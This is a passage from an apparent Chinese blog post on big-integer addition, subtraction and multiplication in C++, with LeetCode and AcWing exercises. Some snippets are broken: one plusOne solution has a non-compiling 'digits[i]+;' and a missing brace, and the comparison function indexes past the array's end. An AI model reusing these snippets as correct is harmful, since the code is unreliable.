class="hljs-comment">//因为数据过大，只能用字符串形式传入</span><br>    vector&lt;<span class="hljs-type">int</span>&gt;A,B;<br>    cin&gt;&gt;a&gt;&gt;b;<span class="hljs-comment">//a=&quot;1234&quot;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<span class="hljs-comment">//逆向计入每一位的值 A[]=[4,3,2,1]</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">add</span>(A,B);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode66题"><a href="#leetcode66题" class="headerlink" title="leetcode66题"></a>leetcode66题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">66.</span> 加一<br>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一。<br><br>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。<br><br>你可以假设除了整数 0 之外，这个整数不会以零开头。<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*我的做法,相对麻烦了点，和模板的高精度加法类似*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>          vector&lt;<span class="hljs-type">int</span>&gt; ans;<br>          <span class="hljs-type">int</span> t=<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=digits.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>          &#123;<br>              t+=digits[i];<br>              ans.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>              t/=<span class="hljs-number">10</span>;<br>          &#125;<br>          <span class="hljs-keyword">if</span>(t) ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>          <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(),ans.<span class="hljs-built_in">end</span>());<br>          <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*题解的做法，就是找到从尾巴开始的最长的9，如果从尾部开始有9就变成0，然后往前移动，如果超出了最开头，就把vector加一*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=digits.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>&amp;&amp;digits[i]==<span class="hljs-number">9</span>)<br>        &#123;<br>           digits[i]=<span class="hljs-number">0</span>;<br>           i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">-1</span>) digits.<span class="hljs-built_in">insert</span>(digits.<span class="hljs-built_in">begin</span>(),<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span> digits[i]+;<br>        <span class="hljs-keyword">return</span> digits;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="leetcode第二题"><a href="#leetcode第二题" class="headerlink" title="leetcode第二题"></a>leetcode第二题</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2</span>. 两数相加<br>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。<br><br>请你将两个数相加，并以相同形式返回一个表示和的链表。<br><br>你可以假设除了数字 <span class="hljs-number">0</span> 之外，这两个数都不会以 <span class="hljs-number">0</span> 开头。<br>示例 <span class="hljs-number">1</span>：<br>输入：l1 = <span class="hljs-selector-attr">[2,4,3]</span>, l2 = <span class="hljs-selector-attr">[5,6,4]</span><br>输出：<span class="hljs-selector-attr">[7,0,8]</span><br>解释：<span class="hljs-number">342</span> + <span class="hljs-number">465</span> = <span class="hljs-number">807</span>.<br>示例 <span class="hljs-number">2</span>：<br><br>输入：l1 = <span class="hljs-selector-attr">[0]</span>, l2 = <span class="hljs-selector-attr">[0]</span><br>输出：<span class="hljs-selector-attr">[0]</span><br>示例 <span class="hljs-number">3</span>：<br><br>输入：l1 = <span class="hljs-selector-attr">[9,9,9,9,9,9,9]</span>, l2 = <span class="hljs-selector-attr">[9,9,9,9]</span><br>输出：<span class="hljs-selector-attr">[8,9,9,9,0,0,0,1]</span><br> <br><br>提示：<br><br>每个链表中的节点数在范围 <span class="hljs-selector-attr">[1, 100]</span> 内<br><span class="hljs-number">0</span> &lt;= Node<span class="hljs-selector-class">.val</span> &lt;= <span class="hljs-number">9</span><br>题目数据保证列表表示的数字不含前导零<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* head=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>),*pMove=head;<br>        <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(l1||l2||t)<br>        &#123;<br>           <span class="hljs-keyword">if</span>(l1) t+=l1-&gt;val;<br>           <span class="hljs-keyword">if</span>(l2) t+=l2-&gt;val;<br>           pMove-&gt;next=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(t%<span class="hljs-number">10</span>);<br>           t/=<span class="hljs-number">10</span>;<br>           pMove=pMove-&gt;next;<br>            <span class="hljs-comment">/*这个很重要，因为如果用for语句的话，当l1没有时还想下找就会报错*/</span><br>           <span class="hljs-keyword">if</span>(l1) l1=l1-&gt;next;<br>           <span class="hljs-keyword">if</span>(l2) l2=l2-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="高精度减法"><a href="#高精度减法" class="headerlink" title="高精度减法"></a>高精度减法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs">给定两个正整数（不含前导 0），计算它们的差，计算结果可能为负数。<br><br>输入格式<br>共两行，每行包含一个整数。<br><br>输出格式<br>共一行，包含所求的差。<br><br>数据范围<br>1≤整数长度≤105<br>输入样例：<br>32<br>11<br>输出样例：<br>21<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(A.<span class="hljs-built_in">size</span>()!=B.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> A.<span class="hljs-built_in">size</span>()&gt;B.<span class="hljs-built_in">size</span>();<span class="hljs-comment">//如果长度不一样就判断A是否长于B</span><br>    <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=A.<span class="hljs-built_in">size</span>();i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//遍历知道找到第一个不一样的数，判断A[i]是否大于B[i]</span><br>        <span class="hljs-keyword">if</span>(A[i]!=B[i]) <span class="hljs-keyword">return</span> A[i]&gt;B[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//如果循环到结束说明一样长，成真和成假都可以</span><br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt;C;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,t=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>();i++)<br>    &#123;<br>        t=A[i]-t;<span class="hljs-comment">//算上是否有进位</span><br>        <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t-=B[i];<span class="hljs-comment">//如果在B的范围内就减去B[i]</span><br>        C.<span class="hljs-built_in">push_back</span>((t+<span class="hljs-number">10</span>)%<span class="hljs-number">10</span>);<span class="hljs-comment">//如果A[i]-t&gt;B[i]的话,+10取余不会有任何影响，但是如果小于的话加10取余就相当于进位</span><br>        <span class="hljs-keyword">if</span>(t&lt;<span class="hljs-number">0</span>) t=<span class="hljs-number">1</span>;<span class="hljs-comment">//判断石是否需要进位</span><br>        <span class="hljs-keyword">else</span> t=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//消去前置零 比如003，要消去00，得出3，因为高位在后面，所以只需要判断back时候是零，如果是零的话，就pop出来</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string a,b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A,B;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<span class="hljs-comment">//别忘了传进来的是字符串，转化成数字需要减去&#x27;0&#x27;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">cmp</span>(A,B))<span class="hljs-comment">//进行比较是否A&gt;B，如果大于的话就正常的进行相加减，如果小于的话就转换成B-A，然后加负号</span><br>    &#123;<br>        <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">sub</span>(A,B);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<span class="hljs-comment">//传入的时候是个位数开始到最高位，所以输出的时候要倒着输出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">sub</span>(B,A);<br>        cout&lt;&lt;<span class="hljs-string">&quot;-&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="高精度乘法"><a href="#高精度乘法" class="headerlink" title="高精度乘法"></a>高精度乘法</h2><h3 id="高精度X低精度"><a href="#高精度X低精度" class="headerlink" title="高精度X低精度"></a>高精度X低精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>vector &lt;<span class="hljs-type">int</span>&gt; <span class="hljs-built_in">mul</span>(vector &lt;<span class="hljs-type">int</span>&gt; &amp; A, <span class="hljs-type">int</span> b) &#123;<br>    vector &lt;<span class="hljs-type">int</span>&gt; C;<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>        t += A[i] * b;       <span class="hljs-comment">// t + A[i] * b = 7218</span><br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>); <span class="hljs-comment">// 只取个位 8</span><br>        t /= <span class="hljs-number">10</span>;             <span class="hljs-comment">// 721 看作 进位</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (t) &#123;            <span class="hljs-comment">// 处理最后剩余的 t</span><br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b;<br>    cin &gt;&gt; a &gt;&gt; b;<br><br>    vector &lt;<span class="hljs-type">int</span>&gt; A;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) A.<span class="hljs-built_in">push_back</span>(a[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br><br>    <span class="hljs-keyword">auto</span> C = <span class="hljs-built_in">mul</span>(A, b);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = C.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) &#123;<br>        cout &lt;&lt; C[i];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高精度X高精度"><a href="#高精度X高精度" class="headerlink" title="高精度X高精度"></a>高精度X高精度</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span> </span>&#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">C</span><span class="hljs-params">(A.size() + B.size() + <span class="hljs-number">7</span>, <span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// 初始化为 0，C的size可以大一点</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; B.<span class="hljs-built_in">size</span>(); j++)<br>            C[i + j] += A[i] * B[j];<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; C.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// i = C.size() - 1时 t 一定小于 10</span><br>        t += C[i];<br>        C[i] = t % <span class="hljs-number">10</span>;<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 必须要去前导 0，因为最高位很可能是 0</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string a, b;<br>    cin &gt;&gt; a &gt;&gt; b; <span class="hljs-comment">// a = &quot;1222323&quot;, b = &quot;2323423423&quot;</span><br><br>    vector&lt;<span class="hljs-type">int</span>&gt; A, B;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        A.<span class="hljs-built_in">push_back</span>(a[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = b.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        B.<span class="hljs-built_in">push_back</span>(b[i] - <span class="hljs-string">&#x27;0&#x27;</span>);<br><br>    <span class="hljs-keyword">auto</span> C = <span class="hljs-built_in">mul</span>(A, B);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = C.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        cout &lt;&lt; C[i];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="acwing例题"><a href="#acwing例题" class="headerlink" title="acwing例题"></a>acwing例题</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">793</span> 高精度乘法<br><br>给定两个非负整数（不含前导 <span class="hljs-number">0</span>） <span class="hljs-selector-tag">A</span> 和 <span class="hljs-selector-tag">B</span>，请你计算 <span class="hljs-selector-tag">A</span>×<span class="hljs-selector-tag">B</span> 的值。<br><br>输入格式<br>共两行，第一行包含整数 <span class="hljs-selector-tag">A</span>，第二行包含整数 <span class="hljs-selector-tag">B</span>。<br><br>输出格式<br>共一行，包含 <span class="hljs-selector-tag">A</span>×<span class="hljs-selector-tag">B</span> 的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">A</span>的长度≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">0</span>≤<span class="hljs-selector-tag">B</span>≤<span class="hljs-number">10000</span><br>输入样例：<br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>输出样例：<br><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++">高精度乘以低精度<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>();i++)<span class="hljs-comment">//讲每一位都乘以b，然后去进位</span><br>    &#123;<br>        t+=A[i]*b;<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t/=<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(t)<span class="hljs-comment">//如果还有进位没去完就一直取，取到结束为止</span><br>    &#123;<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t/=<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span 